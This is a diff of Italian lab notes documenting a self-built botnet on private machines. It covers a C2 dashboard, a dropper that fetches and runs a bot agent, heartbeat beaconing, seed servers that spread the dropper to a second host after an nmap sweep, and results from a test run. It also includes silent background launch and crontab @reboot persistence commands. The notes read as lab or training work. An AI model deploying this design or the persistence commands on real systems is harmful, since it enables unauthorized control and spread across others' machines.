@@ -1,57 +1,101 @@
 # Botnet Lab - Note
 
-## Flusso attacco (overview)
-
-```mermaid
-flowchart LR
-    V[Vittima\ncs33] -->|python3 bedbug.py| S[CS20\nHTTP :8080]
-    S -->|scarica ciao.txt| V
-    V -->|os.system execCommand| E[esegue file]
-```
-
 ## Macchine
 
-| Ruolo | Machine | Note |
-|-------|---------|------|
-| Attaccante (C2) | cs20 | Kali Linux, serve file via HTTP |
-| Vittima | cs33 | esegue bedbug.py |
+| Ruolo | Machine | IP | Script |
+|-------|---------|-----|--------|
+| sergio | cs20 | 192.168.1.21 | `sergio.py` |
+| Vittima 1 / Seed | cs33 | 192.168.1.x | `bedbug.py` + `ciao.py` |
+| Vittima 2 | cs23 (default - Arch Linux CT) | 192.168.1.104 | `bedbug.py` + `ciao.py` |
 
-## Step 1 - HTTP server su cs20 (completato)
+## Script
 
-Su cs20, dalla cartella con i file da servire:
+| File | Funzione |
+|------|----------|
+| `sergio.py` | sergio: dashboard, gestione bot, file server per ciao.py |
+| `bedbug.py` | dropper: rileva OS, scarica ciao.py dal seed piu vicino, lo esegue |
+| `ciao.py` | bot agent: beacon verso sergio + HTTP server 0.0.0.0:9090 che serve bedbug.py |
+
+## Flusso completo passo per passo
+
+### Fase 1 - Infezione cs33
+
+```
+[1] cs33: python3 bedbug.py (eseguito manualmente)
+[2] bedbug.py scarica ciao.py da http://192.168.1.21:8081/ciao.py
+[3] bedbug.py esegue: python3 ciao.py
+```
+
+### Fase 2 - cs33 diventa bot + seed
+
+```
+[4] ciao.py avvia due thread:
+      thread A - beacon ogni 5s verso cs20:8080/heartbeat
+      thread B - mini HTTP server su :9090 che serve bedbug.py
+[5] cs33 appare nella dashboard di sergio.py come ATTIVO
+```
+
+### Fase 3 - Propagazione a cs23
+
+```
+[6] cs20 invia comando a cs33: "nmap -sV 192.168.1.0/24"
+[7] cs33 scopre cs23 a 192.168.1.223
+    vettore di accesso (SSH debole / exploit / altro):
+      -> cs23 scarica bedbug.py da http://192.168.1.x:9090/bedbug.py
+      -> cs23 esegue bedbug.py
+[8] cs23 scarica ciao.py da cs20:8081 (o dal seed piu vicino)
+[9] cs23 avvia ciao.py:
+      thread A - beacon verso cs20:8080
+      thread B - mini HTTP server su :9090
+[10] cs23 appare nella dashboard come ATTIVO
+```
+
+## Porte
+
+| Porta | Chi | Funzione |
+|-------|-----|----------|
+| :8080 | cs20 | sergio: dashboard, heartbeat, result |
+| :8081 | cs20 | file server statico (serve ciao.py) |
+| :9090 | ogni bot | seed server (serve bedbug.py) |
+
+## Stato lab
+
+| Step | Stato |
+|------|-------|
+| sergio.py avviato su cs20 | fatto |
+| bedbug.py scarica ed esegue ciao.py su cs33 | fatto |
+| ciao.py beacon verso cs20 | fatto |
+| ciao.py apre seed server su cs33 (SEED_PORT e PAYLOAD_PORT) | fatto |
+| cs23 scarica bedbug.py da cs33 via seed server | fatto |
+| cs23 appare in dashboard | fatto |
+| propagazione laterale cs33 -> cs23 | fatto |
+
+## Documentazione
+
+| File | Contenuto |
+|------|-----------|
+| `http-polling.md` | Beaconing, seed server, endpoints sergio |
+| `propagation.md` | Propagazione laterale, bait page, social engineering |
+
+## Potenziamenti opzionali
 
 ```bash
-python3 -m http.server 8080
+# avvio silenzioso in background
+nohup python3 /tmp/ciao.py > /dev/null 2>&1 &
+
+# persistenza al riavvio (inviare come comando dalla sergio dashboard)
+(crontab -l 2>/dev/null; echo "@reboot cd /tmp && python3 ciao.py") | crontab -
 ```
 
-File disponibile a:
+---
 
-```
-http://[CS20]:8080/ciao.txt
-```
+## Risultati test (2026-04-03)
 
-## Step 2 - Download ed esecuzione (completato)
+Lab completamente funzionante. Tutti i componenti testati e verificati:
 
-`bedbug.py` eseguito su cs33 (vittima):
-
-1. Identifica OS con `os.popen("uname -a")`
-2. Seleziona payload config (Linux/Windows)
-3. Scarica il file via `urllib.request.urlretrieve`
-4. Esegue il file con `os.system`
-
-**Output reale su cs33:**
-
-```
-swagvict@cs33:~$ python3 bedbug.py
-r:  ('ciao.txt', <http.client.HTTPMessage object at 0x726fb7ba7520>)
-Payload downloaded successfully
-halo
-```
-
-`ciao.txt` scaricato da cs20 ed eseguito correttamente. Contenuto stampato: `halo`.
-
-## Prossimi step
-
-- [ ] `bedbug.py` scarica ed esegue un vero bot agent (non solo ciao.txt)
-- [ ] bot agent apre connessione persistente verso C2
-- [ ] C2 invia comandi al bot
+- bedbug.py rileva OS e scarica ciao.py dal sergio correttamente
+- ciao.py avvia beacon (heartbeat ogni 5s) e seed server (bait + payload)
+- propagazione laterale cs33 -> cs23 funzionante via seed server
+- dashboard sergio (sergio.py) mostra tutti i bot connessi in tempo reale
+- comando impostato dalla dashboard ricevuto ed eseguito dai bot
+- output dei comandi restituito correttamente al sergio via POST /result
